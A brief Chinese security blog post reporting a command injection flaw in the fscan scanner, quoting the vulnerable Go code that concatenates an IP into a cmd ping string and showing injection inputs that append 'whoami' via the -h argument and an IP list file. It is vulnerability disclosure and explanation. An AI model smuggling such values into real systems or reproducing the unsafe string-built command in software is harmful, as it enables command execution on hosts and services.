#  fscan存在命令注入漏洞[doge][doge]   
原创 qianbenhyu  小肥羊安全   2024-12-16 09:36  
  
一个国外的哥们在fscan项目提了个issue。大概说的是fscan存在一个命令注入的漏洞。存在漏洞的代码如下  
```
# Vulnerable way to build command
command = exec.Command("cmd", "/c", "ping -n 1 -w 1 "+ip+" && echo true || echo false")
```  
  
这段代码之间拼接了ping命令和IP，因此可以达到命令注入的目的。  
  
fscan提供两种输入目标的方式，-h 和 -hf。  
  
单个IP如下  
```
./fscan -h "127.0.0.1; whoami > test.txt" -m icmp
```  
  
IP文件如下  
  
ips.txt  
```
127.0.0.1
;whoami>test.txt
```  
  
命令执行  
```
./fscan -hf ips.txt -m icmp
```  
  
  
  
不过都能运行fscan了，为什么还要命令注入呢。如果有人二开fscan，提供了web远程扫描的功能，这种存在威胁。  
  
